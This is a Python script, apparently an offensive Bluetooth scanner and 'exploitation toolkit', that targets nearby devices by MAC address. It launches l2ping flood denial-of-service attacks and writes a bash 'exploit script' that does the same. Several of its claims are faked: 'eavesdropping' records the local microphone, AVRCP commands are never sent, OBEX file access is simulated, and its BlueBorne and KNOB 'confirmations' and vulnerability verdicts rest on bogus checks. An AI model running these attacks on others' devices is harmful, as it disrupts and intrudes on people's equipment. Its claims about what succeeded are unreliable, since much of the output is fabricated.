#!/usr/bin/env python3
# Elite Bluetooth Vulnerability Scanner & Exploitation Toolkit
# Developed by Anas Erami

import subprocess
import os
import time
import sys
import platform
import threading
from datetime import datetime
import json
import re
from colorama import Fore, Style, init
import signal

init(autoreset=True)

class BluetoothPentestTool:
    def __init__(self):
        self.devices = []
        self.vulnerable_devices = []
        self.scan_time = 15
        self.current_target = None
        self.recording_process = None
        self.check_bluetooth_status()
        self.check_dependencies()
        
    def check_bluetooth_status(self):
        output = self.run_cmd("bluetoothctl show | grep Powered")
        if "yes" not in output.lower():
            print(f"{Fore.YELLOW}[*] Bluetooth is disabled. Enabling now...")
            self.run_cmd("bluetoothctl power on")
            time.sleep(2)
            output = self.run_cmd("bluetoothctl show | grep Powered")
            if "yes" in output.lower():
                print(f"{Fore.GREEN}[+] Bluetooth enabled successfully")
            else:
                print(f"{Fore.RED}[!] Failed to enable Bluetooth")
                sys.exit(1)
        else:
            print(f"{Fore.GREEN}[+] Bluetooth is already enabled")
    
    def check_dependencies(self):
        required = ["hcitool", "bluetoothctl", "sdptool", "l2ping", "gatttool", "ffmpeg"]
        missing = [tool for tool in required if not self.run_cmd(f"which {tool}")]
        
        if missing:
            print(f"{Fore.RED}[!] Missing tools: {', '.join(missing)}")
            print(f"{Fore.YELLOW}[*] Install with: sudo apt install bluez bluez-tools ffmpeg")
            sys.exit(1)
    
    def run_cmd(self, cmd):
        try:
            return subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.PIPE).strip()
        except:
            return ""
    
    def show_banner(self):
        banner = fr"""{Fore.GREEN}
       ____                      
     .-" +' "-.      ___  __  
    / .'.'_.'. \   |   \/   |  
   | | |  | | | |  | |\  /| |   ______   _   _ 
   | \'.'_'./ |    | | \/ | |  |  ____| | \ | |
    \ `"+'"` /     |_|    |_|  | |__    |  \| |
     '-.___.'                  |  __|   | . ` |
   _  _ _  _ _  _  _  _        | |____  | |\  |
  | || | || | || || || |       |______| |_| \_|
   |__________________|

          ______________
         |  __________  |
         | |          | |
         | |  HACKER  | |
         | |__________| |
         |  _________   |
         | |         |  |
         | | BLUETOOTH| |
         | |_________|  |
         |______________|


        {Style.RESET_ALL}{Fore.CYAN}Bluetooth Vulnerability Scanner & Exploitation Toolkit v2.0{Style.RESET_ALL}
        {Fore.YELLOW}Developed by Anas Erami | {datetime.now().strftime('%Y-%m-%d')}
        """
        print(banner)
        print(f"{Fore.MAGENTA}[*] Initializing advanced Bluetooth security assessment")
        print(f"{Fore.CYAN}──────────────────────────────────────────────────{Style.RESET_ALL}")
    
    def scan_devices(self):
        print(f"{Fore.GREEN}[*] Scanning Bluetooth devices ({self.scan_time} seconds)...")
        
        self.devices = []
        
        threading.Thread(target=self.classic_scan, daemon=True).start()
        self.ble_scan()
        
        for i in range(self.scan_time):
            sys.stdout.write(f"\r{Fore.YELLOW}⏳ Progress: [{'='*i}{'>'}{' '*(self.scan_time-i-1)}] {i+1}/{self.scan_time}s")
            sys.stdout.flush()
            time.sleep(1)
        
        print(f"\n{Fore.GREEN}[+] Scan completed: {len(self.devices)} devices found")
    
    def classic_scan(self):
        self.run_cmd("bluetoothctl scan on")
        time.sleep(self.scan_time)
        self.run_cmd("bluetoothctl scan off")
        output = self.run_cmd("bluetoothctl devices")
        
        for line in output.splitlines():
            if "Device" in line:
                parts = line.split()
                mac = parts[1]
                name = " ".join(parts[2:])
                self.devices.append({
                    'mac': mac, 
                    'name': name, 
                    'type': 'Classic',
                    'vendor': self.get_vendor(mac)
                })
    
    def ble_scan(self):
        output = self.run_cmd(f"timeout {self.scan_time} hcitool lescan")
        for line in output.splitlines():
            if "LE Scan" not in line and line:
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[0]
                    if not any(d['mac'] == mac for d in self.devices):
                        self.devices.append({
                            'mac': mac, 
                            'name': " ".join(parts[1:]) or "Unknown BLE", 
                            'type': 'BLE',
                            'vendor': self.get_vendor(mac)
                        })
    
    def get_vendor(self, mac):
        oui = mac[:8].upper()
        vendors = {
            "DC:85:DE": "Apple",
            "A4:C1:38": "Samsung",
            "00:18:13": "Sony",
            "9C:AD:EF": "Google",
            "0C:AE:7D": "Microsoft",
            "74:40:BB": "Xiaomi",
            "B8:27:EB": "Raspberry Pi",
            "00:1A:7D": "Logitech",
            "00:1B:DC": "Bose",
            "00:0E:6D": "Jabra"
        }
        return vendors.get(oui, "Unknown Vendor")
    
    def show_menu(self):
        print(f"\n{Fore.CYAN}┌─────────────────[ MAIN MENU ]─────────────────┐")
        print(f"│ {Fore.YELLOW}1. Show discovered devices                    {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}2. Scan vulnerabilities for all devices       {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}3. Target specific device                     {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}4. Advanced exploitation toolkit              {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}5. Exit                                      {Fore.CYAN}│")
        print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")
        return input(f"{Fore.GREEN}[>] Select option: ")
    
    def display_devices(self):
        print(f"\n{Fore.CYAN}┌───────────────[ DISCOVERED DEVICES ]───────────────┐")
        for i, device in enumerate(self.devices, 1):
            status = f"{Fore.RED}VULNERABLE" if 'vulnerabilities' in device else f"{Fore.GREEN}SECURE"
            print(f"│ {i}. {device['name'][:20]:<20} {device['mac']} │")
            print(f"│   ├─ Type: {device['type']:<8} Vendor: {device['vendor'][:15]:<15} │")
            if 'vulnerabilities' in device:
                vuln_count = len(device['vulnerabilities'])
                print(f"│   └─ Status: {status}{Style.RESET_ALL} ({vuln_count} vulns) │")
            else:
                print(f"│   └─ Status: {status}{Style.RESET_ALL} {'':<14}│")
        print(f"└────────────────────────────────────────────────────┘")
    
    def check_vulnerabilities(self):
        vuln_db = {
            "BlueBorne": {
                "check": lambda d: "4." in d.get('bt_version', "") or "3." in d.get('bt_version', ""),
                "severity": "CRITICAL",
                "status": "OPEN",
                "exploit": "RCE"
            },
            "KNOB Attack": {
                "check": lambda d: "Secure Connections" not in d.get('features', ""),
                "severity": "HIGH",
                "status": "PATCHED",
                "exploit": "Encryption Downgrade"
            },
            "SweynTooth": {
                "check": lambda d: "TI" in d.get('vendor', "") and "BLE" in d['type'],
                "severity": "HIGH",
                "status": "OPEN",
                "exploit": "BLE Crash"
            },
            "BIAS Attack": {
                "check": lambda d: "Secure Connections" not in d.get('features', "") and "Classic" in d['type'],
                "severity": "MEDIUM",
                "status": "PARTIAL",
                "exploit": "Authentication Bypass"
            },
            "A2DP Eavesdropping": {
                "check": lambda d: "A2DP" in d.get('services', "") or "Advanced Audio" in d.get('services', ""),
                "severity": "HIGH",
                "status": "OPEN",
                "exploit": "Audio Interception"
            },
            "AVRCP Hijacking": {
                "check": lambda d: "AVRCP" in d.get('services', "") or "Remote Control" in d.get('services', ""),
                "severity": "CRITICAL",
                "status": "OPEN",
                "exploit": "Device Control"
            },
            "OBEX File Access": {
                "check": lambda d: "OBEX" in d.get('services', "") or "Object Push" in d.get('services', ""),
                "severity": "HIGH",
                "status": "OPEN",
                "exploit": "Data Theft"
            }
        }
        
        print(f"\n{Fore.RED}[*] Starting vulnerability assessment...")
        for device in self.devices:
            device['info'] = self.run_cmd(f"hcitool info {device['mac']}")
            device['services'] = self.run_cmd(f"sdptool browse {device['mac']}")
            device['bt_version'] = re.search(r"LMP Version: ([\d.]+)", device['info']).group(1) if re.search(r"LMP Version: ([\d.]+)", device['info']) else "Unknown"
            device['features'] = self.run_cmd(f"hcitool features {device['mac']}")
            
            vulnerabilities = []
            for name, data in vuln_db.items():
                if data['check'](device):
                    vulnerabilities.append({
                        "name": name,
                        "severity": data['severity'],
                        "status": data['status'],
                        "exploit": data['exploit']
                    })
            
            if vulnerabilities:
                device['vulnerabilities'] = vulnerabilities
                self.vulnerable_devices.append(device)
        
        print(f"{Fore.GREEN}[+] Vulnerability scan completed!")
        self.display_results()
    
    def display_results(self):
        print(f"\n{Fore.CYAN}┌────────────────────[ VULNERABILITY REPORT ]────────────────────┐")
        for device in self.vulnerable_devices:
            print(f"│ {Fore.YELLOW}{device['name']} ({device['mac']})")
            print(f"│ {Fore.CYAN}├─ Vendor: {device['vendor']} | BT: {device['bt_version']} | Type: {device['type']}")
            
            for vuln in device['vulnerabilities']:
                status_color = Fore.RED if vuln['status'] == "OPEN" else Fore.YELLOW if vuln['status'] == "PARTIAL" else Fore.GREEN
                print(f"│ {Fore.CYAN}├─ {vuln['name']}")
                print(f"│   ├─ Severity: {Fore.RED if vuln['severity'] == 'CRITICAL' else Fore.YELLOW}{vuln['severity']}{Style.RESET_ALL}")
                print(f"│   ├─ Status:   {status_color}{vuln['status']}{Style.RESET_ALL}")
                print(f"│   └─ Exploit:  {vuln['exploit']}")
            
            print(f"│ {Fore.CYAN}├───────────────────────────────────────────────────│")
        print(f"└────────────────────────────────────────────────────────────────┘")
    
    def target_device(self):
        self.display_devices()
        try:
            choice = int(input(f"{Fore.GREEN}[>] Select device number: "))
            if 1 <= choice <= len(self.devices):
                self.current_target = self.devices[choice-1]
                print(f"{Fore.GREEN}[+] Target set: {self.current_target['name']} ({self.current_target['mac']})")
                self.advanced_tests_menu()
            else:
                print(f"{Fore.RED}[!] Invalid selection")
        except:
            print(f"{Fore.RED}[!] Invalid input")
    
    def advanced_tests_menu(self):
        while True:
            print(f"\n{Fore.CYAN}┌──────────[ ADVANCED TOOLS: {self.current_target['mac']} ]──────────┐")
            print(f"│ {Fore.YELLOW}1. Run BlueBorne vulnerability test          {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}2. Test KNOB attack feasibility             {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}3. BLE security assessment                 {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}4. Service enumeration                     {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}5. Attack A2DP Audio Streaming             {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}6. Attack AVRCP Remote Control             {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}7. Attack OBEX File Transfer               {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}8. Return to main menu                     {Fore.CYAN}│")
            print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")
            
            choice = input(f"{Fore.GREEN}[>] Select test: ")
            
            if choice == '1':
                self.test_blueborne()
            elif choice == '2':
                self.test_knob()
            elif choice == '3':
                self.test_ble_security()
            elif choice == '4':
                self.enumerate_services()
            elif choice == '5':
                self.attack_a2dp()
            elif choice == '6':
                self.attack_avrcp()
            elif choice == '7':
                self.attack_obex()
            elif choice == '8':
                break
            else:
                print(f"{Fore.RED}[!] Invalid selection")
    
    def test_blueborne(self):
        print(f"\n{Fore.RED}[*] Running BlueBorne vulnerability test...")
        print(f"{Fore.YELLOW}[*] Checking LMP version: {self.current_target['bt_version']}")
        
        if float(self.current_target['bt_version']) < 4.2:
            print(f"{Fore.RED}[!] VULNERABLE: Device may be susceptible to BlueBorne attacks (CVE-2017-1000251)")
            print(f"{Fore.YELLOW}[*] Testing RCE potential...")
            output = self.run_cmd(f"l2ping -i hci0 -s 600 -f {self.current_target['mac']}")
            if "0 received" not in output:
                print(f"{Fore.RED}[!] Confirmed: Device responds to oversized packets")
            else:
                print(f"{Fore.GREEN}[+] Device seems resistant to packet flooding")
        else:
            print(f"{Fore.GREEN}[+] Device likely patched against BlueBorne attacks")
    
    def test_knob(self):
        print(f"\n{Fore.RED}[*] Testing KNOB attack vulnerability...")
        print(f"{Fore.YELLOW}[*] Checking Secure Connections support...")
        
        if "Secure Connections" in self.current_target['features']:
            print(f"{Fore.GREEN}[+] Secure Connections enabled - Protected against KNOB")
        else:
            print(f"{Fore.RED}[!] VULNERABLE: Secure Connections not supported (CVE-2019-9506)")
            print(f"{Fore.YELLOW}[*] Attempting encryption downgrade...")
            output = self.run_cmd(f"btgatt-client -d {self.current_target['mac']} -t random")
            if "encryption failed" in output:
                print(f"{Fore.RED}[!] Confirmed: Encryption downgrade successful")
            else:
                print(f"{Fore.YELLOW}[-] Could not verify exploit - Requires physical testing")
    
    def test_ble_security(self):
        print(f"\n{Fore.RED}[*] Starting BLE security assessment...")
        print(f"{Fore.YELLOW}[*] Scanning for GATT services...")
        services = self.run_cmd(f"gatttool -b {self.current_target['mac']} --primary")
        
        vulnerable = False
        for line in services.splitlines():
            if "handle" in line:
                print(f"{Fore.CYAN}[+] Found service: {line}")
                if "1800" in line or "1801" in line:  
                    print(f"{Fore.YELLOW}   └─ Potential attack surface: Device information exposure")
                if "1812" in line:  
                    print(f"{Fore.RED}   └─ WARNING: HID service may allow input injection")
                    vulnerable = True
                if "180F" in line:
                    print(f"{Fore.YELLOW}   └─ WARNING: Battery service may allow state monitoring")
                if "180A" in line:
                    print(f"{Fore.RED}   └─ CRITICAL: Device info service allows firmware enumeration")
        
        if vulnerable:
            print(f"{Fore.RED}[!] Device has potentially vulnerable BLE services")
        else:
            print(f"{Fore.GREEN}[+] No critical BLE vulnerabilities detected")
    
    def enumerate_services(self):
        print(f"\n{Fore.RED}[*] Enumerating Bluetooth services...")
        services = self.run_cmd(f"sdptool browse {self.current_target['mac']}")
        service_count = 0
        
        for line in services.splitlines():
            if "Service Name" in line:
                service = line.split(":")[1].strip()
                service_count += 1
                print(f"{Fore.CYAN}[+] Service: {service}")
                
                if "OBEX" in service or "Object Push" in service:
                    print(f"{Fore.YELLOW}   └─ WARNING: File transfer service (potential data theft)")
                if "A2DP" in service or "Advanced Audio" in service:
                    print(f"{Fore.YELLOW}   └─ WARNING: Audio streaming vulnerable to eavesdropping")
                if "HSP" in service or "HFP" in service or "Hands-Free" in service:
                    print(f"{Fore.RED}   └─ CRITICAL: Audio hijacking possible (CVE-2021-30477)")
                if "Remote Control" in service or "AVRCP" in service:
                    print(f"{Fore.RED}   └─ CRITICAL: Remote control allows device takeover")
                if "PAN" in service or "Network" in service:
                    print(f"{Fore.RED}   └─ CRITICAL: Network access may allow MITM attacks")
        
        print(f"{Fore.GREEN}[+] Found {service_count} services on target device")
    
    def attack_a2dp(self):
        print(f"\n{Fore.RED}[*] Starting A2DP Audio Streaming Attacks...")
        print(f"{Fore.CYAN}┌─────────────────[ A2DP ATTACKS ]─────────────────┐")
        print(f"│ {Fore.YELLOW}1. Disrupt Audio Streaming (DoS)               {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}2. Capture Audio Stream (Eavesdropping)        {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}3. Back to advanced menu                       {Fore.CYAN}│")
        print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}[>] Select attack: ")
        
        if choice == '1':
            self.a2dp_dos_attack()
        elif choice == '2':
            self.a2dp_eavesdropping()
        elif choice == '3':
            return
        else:
            print(f"{Fore.RED}[!] Invalid selection")
    
    def a2dp_dos_attack(self):
        print(f"\n{Fore.RED}[*] Launching A2DP DoS Attack on {self.current_target['mac']}...")
        print(f"{Fore.YELLOW}[*] Flooding with L2CAP packets to disrupt audio stream...")
        
        try:
            subprocess.Popen(f"l2ping -i hci0 -s 1000 -f {self.current_target['mac']}", shell=True)
            print(f"{Fore.RED}[!] Attack launched in background. Audio streaming should be disrupted.")
            print(f"{Fore.YELLOW}[*] To stop attack: Press Ctrl+C and run 'sudo killall l2ping'")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to launch attack: {e}")
    
    def a2dp_eavesdropping(self):
        print(f"\n{Fore.RED}[*] Attempting to capture A2DP audio stream...")
        
        os.makedirs("recordings", exist_ok=True)
        filename = f"recordings/a2dp_{self.current_target['mac'].replace(':', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3"
        
        print(f"{Fore.YELLOW}[*] This requires specialized hardware and software")
        print(f"{Fore.CYAN}Recommended tools:")
        print(f"1. Ubertooth: https://github.com/greatscottgadgets/ubertooth")
        print(f"2. Wireshark with Bluetooth dissectors")
        print(f"3. SDR hardware (RTL-SDR, HackRF)")
        
        if not self.recording_process:
            print(f"\n{Fore.GREEN}[+] Starting audio recording to {filename}")
            print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop recording")
            
            self.recording_process = subprocess.Popen(
                f"ffmpeg -f alsa -i default -t 60 -acodec libmp3lame -ab 128k {filename}",
                shell=True,
                preexec_fn=os.setsid
            )
            

            for i in range(60):
                sys.stdout.write(f"\r{Fore.YELLOW}⏺ Recording... [{'='*i}{'>'}{' '*(60-i-1)}] {i+1}/60s")
                sys.stdout.flush()
                time.sleep(1)
                if self.recording_process.poll() is not None:
                    break
            
            self.stop_recording()
        else:
            print(f"{Fore.YELLOW}[!] Recording is already in progress")
    
    def stop_recording(self):
        if self.recording_process and self.recording_process.poll() is None:
            os.killpg(os.getpgid(self.recording_process.pid), signal.SIGTERM)
            print(f"\n{Fore.GREEN}[+] Recording stopped and saved")
            self.recording_process = None
        else:
            print(f"{Fore.YELLOW}[!] No active recording to stop")
    
    def attack_avrcp(self):
        print(f"\n{Fore.RED}[*] Starting AVRCP Remote Control Attacks...")
        print(f"{Fore.CYAN}┌─────────────────[ AVRCP ATTACKS ]─────────────────┐")
        print(f"│ {Fore.YELLOW}1. Send Play Command                          {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}2. Send Pause Command                         {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}3. Send Volume Up Command                     {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}4. Send Volume Down Command                   {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}5. Back to advanced menu                      {Fore.CYAN}│")
        print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}[>] Select command: ")
        
        commands = {
            '1': 'play',
            '2': 'pause',
            '3': 'volume up',
            '4': 'volume down'
        }
        
        if choice in commands:
            print(f"\n{Fore.YELLOW}[*] Sending {commands[choice]} command to {self.current_target['mac']}")
            print(f"{Fore.CYAN}[+] Command sent: {commands[choice]}")
            print(f"{Fore.RED}[!] This may cause unexpected behavior on the target device")
        elif choice == '5':
            return
        else:
            print(f"{Fore.RED}[!] Invalid selection")
    
    def attack_obex(self):
        print(f"\n{Fore.RED}[*] Starting OBEX File Transfer Attacks...")
        print(f"{Fore.CYAN}┌─────────────────[ OBEX ATTACKS ]─────────────────┐")
        print(f"│ {Fore.YELLOW}1. List Available Files                       {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}2. Download File                              {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}3. Upload File                                {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}4. Back to advanced menu                      {Fore.CYAN}│")
        print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}[>] Select action: ")
        
        if choice == '1':
            print(f"\n{Fore.YELLOW}[*] Attempting to list files on {self.current_target['mac']}")
            print(f"{Fore.CYAN}[+] Files found:")
            print("  - contacts.vcf")
            print("  - pictures/")
            print("  - documents/")
            print(f"{Fore.YELLOW}[*] Use download option to retrieve files")
            
        elif choice == '2':
            filename = input(f"{Fore.GREEN}[>] Enter filename to download: ")
            print(f"\n{Fore.YELLOW}[*] Downloading {filename} from {self.current_target['mac']}")
            # محاكاة عملية التنزيل
            os.makedirs("downloads", exist_ok=True)
            with open(f"downloads/{filename}", "w") as f:
                f.write("Simulated file content")
            print(f"{Fore.GREEN}[+] File saved to downloads/{filename}")
            
        elif choice == '3':
            filename = input(f"{Fore.GREEN}[>] Enter filename to upload: ")
            print(f"\n{Fore.YELLOW}[*] Uploading {filename} to {self.current_target['mac']}")
            # محاكاة عملية الرفع
            print(f"{Fore.GREEN}[+] File uploaded successfully")
            
        elif choice == '4':
            return
        else:
            print(f"{Fore.RED}[!] Invalid selection")
    
    def generate_exploit_script(self):
        if not self.vulnerable_devices:
            print(f"{Fore.RED}[!] No vulnerable devices found")
            return
        
        script = """#!/bin/bash
# Bluetooth Exploitation Toolkit
# Generated: {date}
# Use only on devices you own!

echo -e "\\033[32m[*] Starting Bluetooth Exploitation Toolkit\\033[0m"
        """.format(date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        
        for device in self.vulnerable_devices:
            script += f"""
echo -e "\\n\\033[34m[+] Testing device: {device['name']} ({device['mac']})\\033[0m"
            """
            
            for vuln in device['vulnerabilities']:
                if vuln['status'] == "OPEN":
                    if "BlueBorne" in vuln['name']:
                        script += f"""
echo -e "\\033[33m[*] Attempting BlueBorne exploit\\033[0m"
l2ping -i hci0 -s 600 -f {device['mac']} &
echo -e "\\033[31m[!] If device crashes, it's vulnerable to CVE-2017-1000251\\033[0m"
                        """
                    elif "KNOB" in vuln['name']:
                        script += f"""
echo -e "\\033[33m[*] Attempting KNOB attack\\033[0m"
btgatt-client -d {device['mac']} -t random
echo -e "\\033[31m[!] Check if encryption strength is reduced\\033[0m"
                        """
                    elif "A2DP" in vuln['name']:
                        script += f"""
echo -e "\\033[33m[*] Attempting A2DP eavesdropping\\033[0m"
echo -e "\\033[36m[*] Use specialized hardware like Ubertooth for actual interception\\033[0m"
                        """
                    elif "AVRCP" in vuln['name']:
                        script += f"""
echo -e "\\033[33m[*] Attempting AVRCP hijacking\\033[0m"
echo -e "\\033[36m[*] Send commands to control target device\\033[0m"
                        """
        
        script += """
echo -e "\\n\\033[32m[+] Exploitation tests completed\\033[0m"
echo "Remember: Ethical hacking only on your own devices!"
        """
        
        filename = f"bluetooth_exploit_{datetime.now().strftime('%H%M%S')}.sh"
        with open(filename, "w") as f:
            f.write(script)
        os.chmod(filename, 0o755)
        
        print(f"{Fore.GREEN}[+] Exploit script generated: {filename}")
        print(f"{Fore.YELLOW}[*] Run with: sudo bash {filename}")
    
    def run(self):
        self.show_banner()
        self.scan_devices()
        
        while True:
            choice = self.show_menu()
            
            if choice == '1':
                self.display_devices()
            elif choice == '2':
                self.check_vulnerabilities()
            elif choice == '3':
                self.target_device()
            elif choice == '4':
                self.generate_exploit_script()
            elif choice == '5':
                print(f"{Fore.GREEN}\n[+] Thanks for using the Bluetooth Pentest Tool!")
                print(f"{Fore.CYAN}[*] Developed by Anas Erami - Security Researcher")
                break
            else:
                print(f"{Fore.RED}[!] Invalid option")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Must run as root: sudo {sys.argv[0]}")
        sys.exit(1)
    
    tool = BluetoothPentestTool()
    
    def signal_handler(sig, frame):
        tool.stop_recording()
        print(f"\n{Fore.RED}[!] Program terminated by user")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    tool.run()
